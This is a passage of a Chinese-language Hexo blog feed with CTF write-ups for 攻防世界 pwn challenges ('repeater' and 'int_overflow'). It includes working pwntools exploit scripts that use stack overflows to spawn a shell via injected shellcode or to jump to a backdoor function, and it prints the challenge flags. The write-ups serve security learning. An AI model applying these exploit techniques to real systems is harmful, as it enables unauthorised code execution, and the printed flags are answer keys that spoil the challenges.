class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./repeater"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">64526</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me your name :\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment"># name存储在.bss段上，通过这里的输入向.bss段上写入shellcode</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>  <span class="token comment"># 栈溢出修改v5的值为3281697</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"But there is gift for you :\n"</span><span class="token punctuation">)</span>    main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 保存下程序打印出的main()的真实地址</span>    base_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> <span class="token number">0x0A33</span>  <span class="token comment"># 利用main()的真实地址计算出程序的基地址，0x0A33是main()的偏移地址，可以在ida中查看</span>    shellcode_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x202040</span>  <span class="token comment"># 利用程序的基地址和写入的shellcode在.bss段上的偏移地址，计算出shellcode存放的真实地址</span>    <span class="token comment"># 0x202040是byte_202040在.bss段上的偏移地址，可以在ida中查看 </span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>  <span class="token comment"># 再次通过栈溢出让程序跳转到shellcode的位置去执行</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果：cyberpeace-7165ca68103868530e16b6038318afc5"><a href="#结果：cyberpeace-7165ca68103868530e16b6038318afc5" class="headerlink" title="结果：cyberpeace{7165ca68103868530e16b6038318afc5}"></a>结果：cyberpeace{7165ca68103868530e16b6038318afc5}</h2><p>![[攻防世界-repeater7.png]]</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;收获&quot;&gt;&lt;a href=&quot;#收获&quot; class=&quot;headerlink&quot; title=&quot;收获&quot;&gt;&lt;/a&gt;收获&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&amp;#x3D;&amp;#x3D;IDA 中看到的地址是偏移地址&amp;#x3D;&amp;#x3D;，当开启了 &lt;code&gt;PIE&lt;/code&gt;</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-int_overflow</title>
    <link href="https://4ss1du0us.github.io/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/"/>
    <id>https://4ss1du0us.github.io/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/</id>
    <published>2023-03-13T08:41:57.000Z</published>
    <updated>2023-03-13T08:56:25.023Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>&#x3D;&#x3D;原输入的栈无法溢出，通过 strcpy 复制操作进行溢出&#x3D;&#x3D;</p></li><li><p>&#x3D;&#x3D;注意参数的类型&#x3D;&#x3D;，例如 <code>unsigned __int8 v3</code>，<code>v3 = strlen(s)</code>，<code>v3</code> 是一个 <em>8位 int型</em> 数据，即使 <code>s</code> 的长度为 0x104，<code>v3</code> 也只能为 0x04（<strong>1字节 只能存放 2位 十六进制数</strong>）</p></li><li><p>&#x3D;&#x3D;通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 可以直接往 payload 后面添加 b’a’ 一直填充至指定长度 0x104&#x3D;&#x3D; 【<code>ljust()</code> 的 <code>l</code> 是让 payload 左对齐，往右侧添加字符，<em><strong>一直将原字符串填充到指定长度，而不是填充多少个字符</strong></em>】</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/51ed19eacdea43e3bd67217d08eb8a0e">攻防世界-int_overflow</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br>![[攻防世界-int_overflow1.png]]<br>32 位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行：<br>![[攻防世界-int_overflow2.png]]</p></li><li><p>在 IDA 中分析：<br>![[攻防世界-int_overflow3.png]]<br>跟进 <code>login()</code>：<br>![[攻防世界-int_overflow4.png]]<br>有两个输入，查看数据 <code>s</code> 和 <code>buf</code> 在栈中的位置：<br>![[攻防世界-int_overflow5.png]]<br>![[攻防世界-int_overflow6.png]]<br><code>s</code> 在栈中的长度为 <code>0x28</code>，而输入的 <code>s</code> 长度为 <code>0x19</code>；<code>buf</code> 在栈中的长度为 <code>0x200</code>，而输入的 <code>buf</code> 长度为 <code>0x199</code><br>因此无法通过输入来进行溢出操作</p></li><li><p>跟进函数 <code>check_passwd(buf)</code>：<br>![[攻防世界-int_overflow7.png]]<br>首先控制了 <code>v3</code> 长度要在 <code>4~8</code> 之间，然后将 <code>形参s</code>【其实就是 <code>login()</code> 中的 <code>buf</code>】中存放的内容复制到 <code>dest</code> 中：<br>![[攻防世界-int_overflow8.png]]<br>&#x3D;&#x3D;注意：这里的 <code>v3 = strlen(s)</code> 得到的并不是 <code>形参s</code> 的长度，因为 <code>v3</code> 的定义为 <code>unsigned __int8 v3</code>，即 <code>v3</code> 是一个 <em><strong>无符号的 8位 int型 数据</strong></em>，也就是 <em><strong>1字节</strong></em>，<strong>只能存放两位十六进制数，即：当 buf 的长度为 261（0x105） 时，v3 &#x3D;&#x3D; 0x05</strong>&#x3D;&#x3D;</p></li><li><p>在 IDA 左侧函数列表中，注意到一个后门函数：<br>![[攻防世界-int_overflow9.png]]<br>肯定是需要修改函数返回值转而执行这个 <code>what_is_this()</code> 函数</p></li><li><p>发现在函数 <code>check_passwd(buf)</code> 中进行 <code>strcpy(dest, s)</code> 的复制操作时，虽然之前输入时 <code>buf</code> 无法进行溢出操作，但是通过 <code>strcpy()</code> 复制，可以利用 <code>buf</code> 将 <code>dest</code> 溢出，然后覆盖掉 <code>dest</code> 所在的栈中的返回值，这样就可以实现跳转了</p></li><li><p>但是想要执行复制操作，就必须先满足 <code>v3 &gt; 3u &amp;&amp; v3 &lt;= 8u</code> 的条件，即 <code>v3</code> 可以取值的范围是 <code>4~8</code>，也就是 <code>0x04~0x08</code><br>结合 <code>v3 = strlen(s)</code> 且输入的 <code>buf</code> 长度为 <code>0x199</code><br>可以得出满足条件的 <code>buf</code> 的长度应该为：<code>0x104~0x108</code></p></li><li><p>于是<strong>思路</strong>就很清晰了：<br> &#x3D;&#x3D;① 首先输入 <code>&quot;1&quot;</code> 选择登录<br> ② 由于 <code>login()</code> 中的 <code>s</code> 没有溢出点，在长度为 <code>0x28</code> 以内随便输入即可<br> ③ 由于 <code>login()</code> 中的 <code>buf</code> 在原本的栈中无法溢出，但是 <code>buf</code> 的值会复制到 <code>dest</code> 中，<code>dest</code> 是可以溢出的。根据 <code>dest</code> 所在的栈，要覆盖返回值需要先填充 <code>0x14 - 0x00 + 0x04</code> 个垃圾数据，然后加上 <code>what_is_this()</code> 函数的地址，函数的地址可以通过 <code>elf.symbols[&quot;what_is_this&quot;]</code> 获得<br> ④ 这样就保证了当 <code>buf</code> 的值复制到 <code>dest</code> 后，会转而执行后门函数 <code>what_is_this()</code><br> ⑤ 但是，想要让复制操作执行，首先需要通过前面的 <code>if ( v3 &lt;= 3u || v3 &gt; 8u )</code> 语句，即：让 <code>v3 = strlen(s)</code> 的长度保持在 <code>0x04~0x08</code>，也就是 <code>buf</code> 的长度要保持在 <code>0x104~0x108</code><br> ⑥ 因此，除去前面为 <code>buf</code> 构造 <code>payload</code> 所用的 <code>b&#39;a&#39; * (0x14 - 0x00 + 0x04) + p32(elf.symbols[&quot;what_is_this&quot;])</code> 以外，还要在后面继续填充垃圾字符，让 <code>buf</code> 的长度在 <code>0x104~0x108</code> 之间<br> ⑦ 通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 即可实现在 <code>payload</code> 右边添加 <code>b&#39;a&#39;</code> 一直将 <code>payload</code> 的长度填充至 <code>0x104</code>&#x3D;&#x3D;</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"what_is_this"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56322</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x14</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 溢出dest，使其跳转至what_is_this函数</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x104</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 原payload左对齐，往payload右侧填充b'a'，一直填充到payload的长度为0x104</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your username:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果：cyberpeace-25686bc91ab84046b5a18aaa66041868"><a href="#结果：cyberpeace-25686bc91ab84046b5a18aaa66041868" class="headerlink" title="结果：cyberpeace{25686bc91ab84046b5a18aaa66041868}"></a>结果：cyberpeace{25686bc91ab84046b5a18aaa66041868}</h2><p>![[攻防世界-int_overflow10.png]]</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;收获&quot;&gt;&lt;a href=&quot;#收获&quot; class=&quot;headerlink&quot; title=&quot;收获&quot;&gt;&lt;/a&gt;收获&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&amp;#x3D;&amp;#x3D;原输入的栈无法溢出，通过 strcpy 复制操作进行溢出&amp;#x3D;&amp;#x3D;&lt;/p&gt;
&lt;/li</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://4ss1du0us.github.io/2023/03/13/hello-world/"/>
    <id>https://4ss1du0us.github.io/2023/03/13/hello-world/</id>
    <published>2023-03-13T07:35:06.321Z</published>
    <updated>2023-03-13T07:35:06.321Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
